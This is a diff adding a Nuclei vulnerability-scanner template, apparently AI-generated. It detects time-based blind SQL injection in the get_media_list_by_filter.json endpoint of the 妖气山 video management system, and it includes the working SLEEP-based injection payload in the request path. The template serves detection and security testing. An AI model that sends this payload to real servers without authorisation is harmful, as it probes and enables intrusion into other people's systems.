@@ -1,0 +1,36 @@
+id: yaoqishan-get-media-list-by-filter-json-sqli
+info:
+  name: 妖气山视频管理系统 SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL Injection vulnerability in 妖气山视频管理系统's get_media_list_by_filter.json endpoint.
+
+variables:
+  t1: "{{rand_int(2,5)}}"
+  t2: "{{to_number(t1) + to_number(t1)}}"
+  t3: "{{to_number(t2) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/api/get_media_list_by_filter.json?typeId=1%27+AND+(SELECT+5396+FROM+(SELECT(SLEEP({{t1}})))iVgi)+AND+%27wsMJ%27=%27wsMJ'
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "操作成功"
+          - '"data":'
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
+      - type: dsl
+        dsl:
+          - "duration > to_number(t2)"
+          - "duration < to_number(t3)"
+      - type: status
+        status:
+          - 200
